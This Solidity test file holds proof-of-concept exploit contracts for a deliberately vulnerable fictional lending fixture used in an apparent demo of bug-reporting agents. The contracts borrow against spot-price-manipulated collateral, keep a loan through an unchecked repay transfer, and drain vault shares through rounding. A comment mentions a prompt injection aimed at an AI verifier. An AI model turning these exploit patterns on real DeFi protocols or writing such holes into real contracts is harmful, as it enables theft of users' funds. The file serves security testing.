// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// DELIBERATELY VULNERABLE TEST FIXTURE — never deploy to mainnet.
// Proofs of concept for the bugs we planted on purpose in the fictional "Acme Lend" fixture.
// They exist only as test fixtures for the Antibody demo (scripted agents A–F) and only work
// against this repo's fixture. Each PoC runs as one contract-creation transaction from a fresh
// salted sender (Antibody bundle mode); B and E need no contract (a single call).

import {AcmeETH, AcmeUSD} from "../../../src/acme/AcmeTokens.sol";
import {AcmePool} from "../../../src/acme/AcmePool.sol";
import {AcmeLend} from "../../../src/acme/AcmeLend.sol";
import {AcmeVault} from "../../../src/acme/AcmeVault.sol";

library PocMath {
    function borrowLimit(AcmeLend lend, address who) internal view returns (uint256) {
        return lend.collateralOf(who) * lend.collateralPrice() / 1e18 * lend.LTV_BPS() / 10_000;
    }
}

/// Agent A — planted bug #1 (Critical): collateral valued at the pool's spot price.
/// Route: borrow a little, buy acETH in the thin pool (spot price up), post it, borrow the rest.
contract PocA_SpotPriceBorrow {
    constructor(AcmeETH eth, AcmeUSD usd, AcmePool pool, AcmeLend lend) payable {
        eth.deposit{value: msg.value}();
        eth.approve(address(lend), type(uint256).max);
        lend.depositCollateral(msg.value);
        uint256 first = PocMath.borrowLimit(lend, address(this)) * 2 / 3; // healthy: 50% LTV
        lend.borrow(first);
        usd.approve(address(pool), type(uint256).max);
        uint256 bought = pool.swap(address(usd), first, 0, address(this));
        lend.depositCollateral(bought);
        uint256 room = PocMath.borrowLimit(lend, address(this)) - lend.debtOf(address(this));
        uint256 cash = usd.balanceOf(address(lend));
        lend.borrow(room < cash ? room : cash);
        usd.transfer(msg.sender, usd.balanceOf(address(this)));
    }
}

/// Agent D — the same bug through a different route (committed after A): donate acUSD to the pool
/// and `sync()` instead of swapping. Same rule, same function (AcmeLend.borrow) => duplicate of A.
contract PocD_DonationSyncBorrow {
    constructor(AcmeETH eth, AcmeUSD usd, AcmePool pool, AcmeLend lend) payable {
        eth.deposit{value: msg.value}();
        eth.approve(address(lend), type(uint256).max);
        lend.depositCollateral(msg.value);
        uint256 first = PocMath.borrowLimit(lend, address(this)) * 2 / 3;
        lend.borrow(first);
        usd.transfer(address(pool), first);
        pool.sync();
        uint256 room = PocMath.borrowLimit(lend, address(this)) - lend.debtOf(address(this));
        uint256 cash = usd.balanceOf(address(lend));
        lend.borrow(room < cash ? room : cash);
        usd.transfer(msg.sender, usd.balanceOf(address(this)));
    }
}

/// Agent C — a genuinely profitable arbitrage and nothing else: the pool is seeded 4% above the
/// reference price, so selling a little acETH into it earns a small profit. Profit is not a bug:
/// no invariant breaks (NoViolation). C's report text carries a prompt injection the verifier
/// never reads.
contract PocC_PoolArbitrage {
    constructor(AcmeETH eth, AcmeUSD usd, AcmePool pool, uint256 sellAmount) payable {
        eth.deposit{value: msg.value}();
        eth.approve(address(pool), sellAmount);
        pool.swap(address(eth), sellAmount, 0, address(this));
        eth.withdraw(eth.balanceOf(address(this)));
        usd.transfer(msg.sender, usd.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }
}

/// Agent F — planted bug #3 (Critical): AcmeLend.repay ignores transferFrom's return value.
/// Borrow (healthy), "repay" without any allowance (acUSD returns false, no revert), withdraw the
/// collateral and keep the loan. Same rule as A (solvency), different function => a new finding.
contract PocF_UncheckedRepay {
    constructor(AcmeETH eth, AcmeUSD usd, AcmeLend lend) payable {
        eth.deposit{value: msg.value}();
        eth.approve(address(lend), type(uint256).max);
        lend.depositCollateral(msg.value);
        uint256 amount = PocMath.borrowLimit(lend, address(this)) * 2 / 3;
        lend.borrow(amount);
        lend.repay(amount); // no acUSD approval: the transfer silently fails
        lend.withdrawCollateral(lend.collateralOf(address(this)));
        eth.withdraw(eth.balanceOf(address(this)));
        usd.transfer(msg.sender, usd.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }
}

/// Project (t0) — the declared known issue, planted bug #4 (Medium): AcmeVault.withdraw rounds the
/// burned shares down, so with shares worth more than 1 wei, `withdraw(1)` burns nothing. The
/// project submits this PoC before the program opens; it claims (share_price, AcmeVault.withdraw).
contract PocKnown_DustWithdrawals {
    constructor(AcmeVault vault, uint256 times) {
        for (uint256 i; i < times; ++i) vault.withdraw(1);
    }
}
